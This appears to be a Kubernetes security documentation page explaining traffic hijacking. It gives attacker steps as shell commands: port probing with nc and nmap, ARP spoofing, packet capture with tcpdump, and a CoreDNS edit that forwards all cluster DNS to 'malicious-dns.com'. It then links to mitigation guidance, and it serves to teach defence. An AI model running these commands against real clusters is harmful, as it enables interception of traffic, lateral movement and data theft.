---
sidebar_position: 11
title: "Traffic Hijacking"
description: "How attackers manipulate Kubernetes network traffic to intercept, redirect, or disrupt communication between workloads."
---

# Traffic Hijacking

**Traffic hijacking** in Kubernetes occurs when an attacker intercepts, redirects, or disrupts network traffic within the cluster. This can lead to **data exfiltration, man-in-the-middle (MITM) attacks, service downtime, and unauthorized access to sensitive information**.

---

## Exploitation Steps: Manipulating Kubernetes Network Traffic

An attacker exploits **misconfigured network policies, insecure service exposure, or DNS manipulation** to hijack traffic.

### Step 1: Exploit Missing Network Policies

If network policies are not enforced, the attacker scans for open communication paths:

```bash
kubectl get networkpolicies --all-namespaces
```

If no restrictive policies exist, the attacker can access internal workloads:

```bash
kubectl run attacker-pod --rm -it --image=alpine -- /bin/sh
nc -zv <target-pod-ip> 443
```

Without network segmentation, lateral movement between pods is possible.

### Step 2: Conduct a Man-in-the-Middle (MITM) Attack

If an attacker gains access to a compromised pod, they can intercept internal traffic using **ARP spoofing**:

```bash
arpspoof -i eth0 -t <victim-ip> <gateway-ip>
```

Or by using **tcpdump** to capture sensitive data:

```bash
tcpdump -i eth0 -A port 443
```

This allows the attacker to read and modify unencrypted traffic.

### Step 3: Manipulate Kubernetes DNS

If **CoreDNS** is misconfigured, the attacker can modify DNS responses to redirect traffic:

```bash
kubectl edit configmap coredns -n kube-system
```

By injecting a rogue DNS entry:

```yaml
.:53 {
    forward . malicious-dns.com
}
```

All DNS queries in the cluster are now redirected to the attacker's controlled server.

### Step 4: Abuse External Service Exposure

If services are exposed via **NodePort** or **LoadBalancer** without proper authentication, the attacker accesses internal workloads directly:

```bash
nmap -p 30000-32767 <cluster-node-ip>
```

If a publicly exposed service is found, the attacker exploits it to extract sensitive data.

### Result

The attacker has successfully **intercepted, manipulated, or redirected cluster traffic**, leading to **data theft, unauthorized access, and service disruption**.

---

## Mitigation Steps

To protect against **traffic hijacking**, follow the security best practices outlined in:

➡ **[Securing Kubernetes Network Traffic](/docs/best_practices/cluster_setup_and_hardening/network_security/traffic_hijacking_mitigation)**

This guide covers techniques such as **enforcing network policies, securing CoreDNS, encrypting intra-cluster traffic, and restricting service exposure** to prevent unauthorized network manipulation.
